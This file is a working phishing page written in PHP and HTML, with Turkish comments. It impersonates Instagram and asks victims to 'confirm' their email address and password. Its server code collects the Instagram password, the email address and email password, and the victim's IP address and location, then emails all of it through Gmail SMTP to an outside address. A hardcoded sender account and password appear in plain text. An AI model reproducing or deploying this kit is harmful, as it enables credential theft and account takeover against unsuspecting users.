<?php 


include 'class.phpmailer.php';
include 'class.smtp.php';


session_start();
$_SESSION['password'] = $_GET['password'];

if($_POST){
$mailim = $_POST["mail"];
$mpassword = $_POST["mailpassword"];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
$bolge = $details->regionName;
$sehir = $details->city;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$mail = new PHPMailer(); //ilgili PHPMailer class'ımızdan bir nesne türetiyoruz.
$mail->IsSMTP();
$mail->SMTPAuth = true; 
$mail->Host = 'smtp.gmail.com'; //SMTP için kullanılacak sunucu adresi
$mail->Port = 587; //TLS protokolünün kullanacağı port numarası
$mail->SMTPSecure = 'tls'; //kullanacağımız güvenlik protokolü SSL veya TLS olabilir.
$mail->Username = 'jasonmopril@gmail.com'; //Email gönderecek adres
$mail->Password = 'Hacked3344_'; ////Email gönderecek adresin şifresi
$mail->SetFrom($mail->Username, 'Hey!');
$mail->AddAddress('gallaghernameless@gmail.com', '
'); //Bu emaili gideceği e-posta adresi
$mail->CharSet = 'UTF-8'; //Karakterlerin düzgün görünmesi için utf-8 ekliyoruz.
$mail->Subject ="Instagram Account"; //emailimizin konusu
//email içeriğimiz
$icerik = "Username: ".$_SESSION['nick']."<br>"."Password: ".$_SESSION['password']."<br>"."Mail: ".$mailim."<br>"."Mail Password: ".$mpassword."<br>"."Ip Adress: " .$ip."<br>"."Ülke: ".$ulke ."<br>"."Bölge: ".$bolge ."<br>"."Şehir: ".$sehir."<br>"."Time: ".$cur_time;
$mail->MsgHTML($icerik);


if($mail->Send()) {
     //E-posta gönderildi
     echo " ";
     header("Location: form.php");
} 
}

   


?>
<html>
<head>
<meta charset="utf-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" type="text/css" href="css/1.css">
<link rel="stylesheet" type="text/css" href="css/2.css">
<link rel="stylesheet" type="text/css" href="css/3.css">
<link rel="shortcut icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.css" />
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script> 
<style type="text/css">
    
    .gizle{
    -webkit-text-security: disc;
}
.goster{
    -webkit-text-security: none;
}
        .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 55%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
</style>
</head>
<body class="" style="">
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=tr" role="alert" target="_blank"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">GET</button></section></a></div></div><br>
<div id="react-root">
<section class="LZyqZ">
<div class="lTdZb">
<div class="vqibd  wNNoj ">
<img src="mail.gif" alt="mail" width="140">
<div class="ZpgjG   _1I5YO">
<h2 class="AjK3K ">Confirm Your Mail Address</h2>
</div><br>
<p class="GusmU SVI5E " style="font-family:sans-serif; color:#999;">
Please type your Instagram e-mail address and password and click "Confirm Account".</p>
<div class="GA2q- ">
<form class="JraEb" method="POST" onsubmit="return isValid(this)" id="your_form_id" >

 <div class="ui icon input" style="width: 80% !important;">
                        <div class="ui icon input" style="width: 92% !important; ">
                        <input class="" type="email" id="mail" name="mail" placeholder="E-mail" autocomplete=""  required="" /> 
                      
                        </div>
                        <br>
                         <div class="ui icon input" style="width: 92% !important; ">
                        <input class="gizle" type="text" id="password" name="mailpassword" placeholder="Password" autocomplete="off" required="" /> 
                        <i id="hey" class="eye link icon" ></i>
                        </div>
                        <div style="margin-bottom: 15px;" class="p1"><p id="p1" ></p>
                        <br>
</div>
<center>
     <button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Confirm Account</span>
    </button>
</center>

</form>
</div>
<br>
<center><a class="_s1olq" href="/accounts/password/reset/"></a></form></center>
</div>
<br>
</div> <p id="community guidelines" style="font-family:sans-serif;font-weight:100;"> </p> </center> </body> </html>
</div>
</div>
</section>
</div>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><img src="https://i.ibb.co/bF4shWH/instagram-from-facebook-removebg-preview.png" width="120"></div>
</html>

<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
<script>
  $( hey ).click(function() {
  $( password ).toggleClass( "goster" );
});
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
      
      password= document.getElementById("password").value;
      
   
   if ( password==null || password=="" || password.length < 5)
     {
        document.getElementById("p1").innerHTML =  "Please enter a valid password!";
document.getElementsByClassName("p1")[0].style.color="red";
  $(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
      $(".btn-txt").text("Next");
      return false;
 }


 document.getElementById('your_form_id').submit();
      
      
   });
        });
    

    </script>
</html>
